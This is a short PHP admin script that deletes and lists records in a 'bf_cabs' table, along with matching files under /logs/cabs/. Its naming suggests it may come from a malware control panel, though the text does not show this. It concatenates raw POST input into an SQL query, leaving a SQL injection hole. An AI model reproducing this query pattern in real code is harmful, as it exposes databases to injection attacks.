<?php

$smarty->assign('rand_name', mt_rand(0000000000, 9999999999));

//print_rm($_POST);

if(count($_POST['types']) > 0){	foreach($_POST['types'] as $s){		$del = $mysqli->query('SELECT id,file FROM bf_cabs WHERE (MD5(type) = \''.$s.'\')', null, null, false);
        foreach($del as $d){        	$mysqli->query('DELETE FROM bf_cabs WHERE (id = \''.$d->id.'\') LIMIT 1');
        	@unlink('/logs/cabs/' . $d->file);
        }
	}
}

//print_rm($mysqli->sql);

$types = $mysqli->query('SELECT DISTINCT(md5(type)) md5_type, type FROM bf_cabs', null, null, false);
$smarty->assignbyref('items', $types);

?>